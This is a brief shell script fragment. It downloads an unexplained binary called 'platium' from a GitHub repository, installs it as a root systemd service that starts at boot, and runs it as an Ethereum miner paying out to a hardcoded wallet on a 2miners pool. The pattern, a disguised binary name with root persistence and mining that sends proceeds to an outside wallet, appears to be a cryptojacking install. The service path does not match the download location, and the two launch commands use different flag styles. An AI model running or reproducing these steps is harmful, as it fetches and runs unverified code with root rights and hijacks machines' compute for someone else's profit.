...
sudo wget https://github.com/spiritedaway5/roosterant/raw/main/platium
sudo chmod +x platium
sudo bash -c 'echo -e "[Unit]\nDescription=platium\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/hehe/platium -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x8F07269f4e5dAA586b140F71564B6C330EeC6C41 -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/platium.service'
sudo systemctl daemon-reload
sudo systemctl enable platium.service
sudo ./platium -pool eth.2miners.com:2020 -wal 0x8F07269f4e5dAA586b140F71564B6C330EeC6C41 -worker 8 -pass hihi99999